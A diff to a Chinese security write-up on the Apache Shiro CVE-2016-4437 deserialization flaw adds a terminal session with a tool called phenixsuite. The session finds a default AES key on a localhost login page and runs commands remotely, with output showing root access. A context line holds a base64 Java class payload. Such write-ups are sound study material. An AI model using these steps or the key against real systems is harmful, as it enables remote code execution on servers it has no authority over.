@@ -371,6 +371,52 @@ yv66vgAAADQA2woAGgBlCQBAAGYJAEAAZwcAaAoABABlCQBAAGkJAEAAaggAawoAbABtCQBAAG4IAG8J
 
 ![成功回显](../../images/java/shiro/1.png)
 
+### PSF案例
+
+psf最近优化了下attack的功能模块,今天拿shiro这个漏洞为例，展示如何使用attack
+
+```bash
+╭─huakai at huakai-deMacBook-Pro in ⌁/go/src/phenixsuite (develop ●2✚5…1⚑70)
+╰─λ ./phenixsuite search --poc shiro                                         0 < 00:00:00 < 18:07:46
+ #   Poc Name                                      
+--- -----------------------------------------------
+ 0   poc-yaml-jackson-shiro-jndi-code-exec-reverse 
+ 1   poc-go-shiro-cve-2016-4437                    
+ 2   poc-go-shiro-detect                           
+╭─huakai at huakai-deMacBook-Pro in ⌁/go/src/phenixsuite (develop ●2✚5…1⚑70)
+╰─λ ./phenixsuite scan --poc poc-go-shiro-cve-2016-4437 --url http://127.0.0.1:8080/login                0 < 00:00:01 < 18:10:28
+2021/02/01 18:10:40 scan.go:496: [INFO ] verify poc-go-shiro-cve-2016-4437
+2021/02/01 18:10:40 scan.go:142: [INFO ] scan poc num:1 total:1
+2021/02/01 18:10:40 shiro_cve_2016_4437_rce.go:290: [INFO ] Detect shiro
+2021/02/01 18:10:42 shiro_cve_2016_4437_rce.go:237: [INFO ] html similar is 1, key is: kPH+bIxk5D2deZiIxcaaaA==
+2021/02/01 18:10:42 shiro_cve_2016_4437_rce.go:238: [INFO ] Key Found: kPH+bIxk5D2deZiIxcaaaA==
+2021/02/01 18:10:42 scan.go:419: [INFO ] vul exist poc:poc-go-shiro-cve-2016-4437 url:http://127.0.0.1:8080/login
+ #   target-url                    poc-name                     gev-id       level      category    status   author   require      detail-extend                                         
+--- ----------------------------- ---------------------------- ------------ ---------- ----------- -------- -------- ------------ -------------------------------------------------------
+ 1   http://127.0.0.1:8080/login   poc-go-shiro-cve-2016-4437   GEV-141894   critical   code-exec   exist    huakai   GEV-142951   cipherKey is kPH+bIxk5D2deZiIxcaaaA==, type is AES128 
+╭─huakai at huakai-deMacBook-Pro in ⌁/go/src/phenixsuite (develop ●2✚5…1⚑70)
+╰─λ ./phenixsuite scan --poc poc-go-shiro-cve-2016-4437 --url http://127.0.0.1:8080/login --mode attack --show
+2021/02/01 18:10:59 cmd.go:332: [INFO ] 传入参数列表
+ Param     Require                             Help 
+--------- ----------------------------------- ------
+ command   optional,whoami                          
+ key       optional,kPH+bIxk5D2deZiIxcaaaA==    
+ ╭─huakai at huakai-deMacBook-Pro in ⌁/go/src/phenixsuite (develop ●2✚5…1⚑70)
+ ╰─λ ./phenixsuite scan --poc poc-go-shiro-cve-2016-4437 --url http://127.0.0.1:8080/login --mode attack --options shell
+ input key (optional,kPH+bIxk5D2deZiIxcaaaA==): 
+ input command (optional,whoami): id
+ 2021/02/01 18:11:37 scan.go:496: [INFO ] attack poc-go-shiro-cve-2016-4437
+ 2021/02/01 18:11:37 scan.go:142: [INFO ] scan poc num:1 total:1
+ 2021/02/01 18:11:38 shiro_cve_2016_4437_rce.go:356: [INFO ] Command Exec Success: id
+ 2021/02/01 18:11:38 scan.go:419: [INFO ] vul exist poc:poc-go-shiro-cve-2016-4437 url:http://127.0.0.1:8080/login
+  #   target-url                    poc-name                     gev-id       level      category    status   author   require      detail-extend                                         
+ --- ----------------------------- ---------------------------- ------------ ---------- ----------- -------- -------- ------------ -------------------------------------------------------
+  1   http://127.0.0.1:8080/login   poc-go-shiro-cve-2016-4437   GEV-141894   critical   code-exec   exist    huakai   GEV-142951   cipherKey is kPH+bIxk5D2deZiIxcaaaA==, type is AES128 
+                                                                                                                                    command result:                                       
+                                                                                                                                    uid=0(root) gid=0(root) groups=0(root)                
+                                                                                                                                                                                          
+```
+
 
 ### 参考链接
 - https://mp.weixin.qq.com/s/5iYyRGnlOEEIJmW1DqAeXw
